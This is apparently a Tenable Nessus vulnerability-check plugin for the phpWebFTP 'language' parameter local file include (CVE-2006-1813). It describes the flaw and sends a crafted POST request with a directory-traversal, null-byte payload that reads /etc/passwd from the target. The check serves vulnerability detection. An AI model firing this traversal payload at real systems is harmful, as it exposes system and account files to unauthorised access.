#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is affected by a
local file include issue. 

Description :

The remote host is running phpWebFTP, a web-based FTP client written
in PHP. 

The version of phpWebFTP installed on the remote host fails to
sanitize user-supplied input to the 'language' parameter of the
'index.php' script before using it in a PHP 'include()' function.  An
unauthenticated attacker may be able to exploit this issue to view
arbitrary files or to execute arbitrary PHP code on the remote host,
subject to the privileges of the web server user id. 

Note that successful exploitation of this issue requires that either
PHP's 'magic_quotes_gpc' setting be disabled or the attacker have the
ability to edit files on the remote host. 

See also :

http://www.securityfocus.com/archive/1/431115/30/0/threaded

Solution :

Unknown at this time.

Risk factor :

Medium / CVSS Base Score : 4.6
(AV:R/AC:L/Au:NR/C:P/I:P/A:N/B:N)";


if (description)
{
  script_id(21238);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-1813");
  script_bugtraq_id(17557);

  script_name(english:"phpWebFTP language Parameter Local File Include Vulnerability");
  script_summary(english:"Tries to read /etc/passwd using phpWebFTP");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/webftp", "/ftp", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Grab index.php.
  res = http_get_cache(item:string(dir, "/index.php"), port:port);
  if (res == NULL) exit(0);

  # If it looks like phpWebFTP...
  if ("phpWebFTP comes with ABSOLUTELY NO WARRANTY" >< res)
  {
    # Try to exploit one of the flaws to read a file.
    file = "../../../../../../../../../../../../etc/passwd%00";
    postdata = string(
      "server=1&",
      "port=21&",
      "goPassive=on&",
      "user=1&",
      "password=1&",
      "language=", file
    );
    req = string(
      "POST ", dir, "/index.php HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: Mozilla/4.75 [en] (X11, U; Nessus)\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if there's an entry for root.
    #
    # nb: the application explicitly disables warnings so if the exploit fails
    #     we won't know if it was just because magic_quotes_gpc was enabled.
    if (egrep(pattern:"root:.*:0:[01]:", string:res))
    {
      contents = res - strstr(res, "</TD>");
      if (isnull(contents)) contents = res;

      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );

      security_warning(port:port, data:report);
      exit(0);
    }
  }
}
